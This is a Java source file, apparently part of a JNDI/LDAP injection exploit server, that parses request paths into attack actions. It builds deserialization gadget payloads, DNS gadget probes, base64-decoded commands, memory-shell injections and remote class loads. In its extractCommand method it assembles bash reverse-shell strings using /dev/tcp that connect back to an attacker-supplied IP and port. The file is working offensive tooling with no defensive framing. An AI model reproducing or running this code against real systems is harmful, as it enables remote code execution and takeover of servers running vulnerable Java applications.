package com.bloom.parser;

import com.bloom.util.Functions;
import java.util.Base64;

public class RouteParser {

    public ParsedRoute parse(String baseDN) {
        if (baseDN == null || baseDN.isEmpty()) {
            return ParsedRoute.builder()
                    .rawBaseDN(baseDN)
                    .addError("baseDN 为空")
                    .build();
        }

        String[] parts = baseDN.split("/");
        if (parts.length < 2) {
            return ParsedRoute.builder()
                    .rawBaseDN(baseDN)
                    .addError("路径格式不正确，至少需要两段")
                    .build();
        }

        String firstSegment = parts[0].toLowerCase();

        if (firstSegment.equals("basic")) {
            return parseBasic(baseDN, parts);
        } else if (firstSegment.equals("fuzz")) {
            return parseFuzz(baseDN, parts);
        } else if (firstSegment.equals("fuzzbydns")) {
            return parseFuzzByDNS(baseDN, parts);
        } else {
            return parseGadget(baseDN, parts);
        }
    }

    private ParsedRoute parseBasic(String baseDN, String[] parts) {
        if (parts.length < 2) {
            return ParsedRoute.builder()
                    .routeType(RouteType.BASIC)
                    .rawBaseDN(baseDN)
                    .addError("basic 路径格式不正确")
                    .build();
        }

        String method = parts[1].toLowerCase();
        String command = extractCommand(baseDN, method);

        ActionType action = classifyBasicAction(method, command);

        return ParsedRoute.builder()
                .routeType(RouteType.BASIC)
                .payloadType("basic")
                .method(method)
                .command(command)
                .actionType(action)
                .rawBaseDN(baseDN)
                .build();
    }

    private ParsedRoute parseFuzz(String baseDN, String[] parts) {
        if (parts.length < 3) {
            return ParsedRoute.builder()
                    .routeType(RouteType.FUZZ)
                    .rawBaseDN(baseDN)
                    .addError("fuzz 路径格式不正确，需要 fuzz/[GadgetType]/[domain]")
                    .build();
        }

        String payloadType = parts[1];
        String domain = parts[2];

        return ParsedRoute.builder()
                .routeType(RouteType.FUZZ)
                .payloadType(payloadType)
                .method("fuzz")
                .command(domain)
                .actionType(ActionType.DNS_PROBE)
                .rawBaseDN(baseDN)
                .build();
    }

    private ParsedRoute parseFuzzByDNS(String baseDN, String[] parts) {
        if (parts.length < 2) {
            return ParsedRoute.builder()
                    .routeType(RouteType.FUZZ_BY_DNS)
                    .rawBaseDN(baseDN)
                    .addError("fuzzbyDNS 路径格式不正确，需要 fuzzbyDNS/[domain]")
                    .build();
        }

        String domain = parts[1];

        return ParsedRoute.builder()
                .routeType(RouteType.FUZZ_BY_DNS)
                .payloadType("FindGadgetByDNS")
                .method("fuzzbyDNS")
                .command(domain)
                .actionType(ActionType.DNS_PROBE)
                .rawBaseDN(baseDN)
                .build();
    }

    private ParsedRoute parseGadget(String baseDN, String[] parts) {
        String payloadType = parts[0];
        String method = parts.length > 1 ? parts[1].toLowerCase() : "";
        String command = extractCommand(baseDN, method);

        ActionType action = classifyGadgetAction(method, command, payloadType);

        return ParsedRoute.builder()
                .routeType(RouteType.GADGET)
                .payloadType(payloadType)
                .method(method)
                .command(command)
                .actionType(action)
                .rawBaseDN(baseDN)
                .build();
    }

    private String extractCommand(String baseDN, String method) {
        switch (method) {
            case "base64":
                String[] parts = baseDN.split("/");
                if (parts.length >= 3) {
                    return new String(Base64.getDecoder().decode(parts[2]));
                }
                return "";
            case "reverseshell":
            case "reverseshell2":
                parts = baseDN.split("/");
                if (parts.length >= 4) {
                    String ip = parts[2];
                    String port = parts[3];
                    if (Functions.ipCheck(ip)) {
                        if (method.equals("reverseshell")) {
                            return "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                        } else {
                            return "bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                        }
                    }
                }
                return "";
            case "memshell":
                String memshellPart = baseDN.substring(baseDN.indexOf("/memshell/") + 10);
                if (memshellPart.startsWith("FILE:")) {
                    return memshellPart;
                } else {
                    return "CLASS:" + memshellPart;
                }
            default:
                int firstSlash = baseDN.indexOf("/");
                if (firstSlash >= 0 && firstSlash < baseDN.length() - 1) {
                    return baseDN.substring(firstSlash + 1);
                }
                return baseDN;
        }
    }

    private ActionType classifyBasicAction(String method, String command) {
        if (method.equals("memshell")) {
            return ActionType.MEMSHELL;
        }
        if (method.equals("reverseshell") || method.equals("reverseshell2")) {
            return ActionType.REVERSE_SHELL;
        }
        if (method.equals("base64") || !command.isEmpty()) {
            return ActionType.COMMAND;
        }
        return ActionType.REMOTE_CLASS_LOAD;
    }

    private ActionType classifyGadgetAction(String method, String command, String payloadType) {
        if (payloadType.equalsIgnoreCase("URLDNS") || payloadType.equalsIgnoreCase("fuzzbyDNS")) {
            return ActionType.DNS_PROBE;
        }
        if (method.equals("memshell")) {
            return ActionType.MEMSHELL;
        }
        if (method.equals("reverseshell") || method.equals("reverseshell2")) {
            return ActionType.REVERSE_SHELL;
        }
        if (method.equals("base64")) {
            return ActionType.COMMAND;
        }
        if (!command.isEmpty() && !command.startsWith("http")) {
            return ActionType.COMMAND;
        }
        return ActionType.SERIALIZED_GADGET;
    }
}
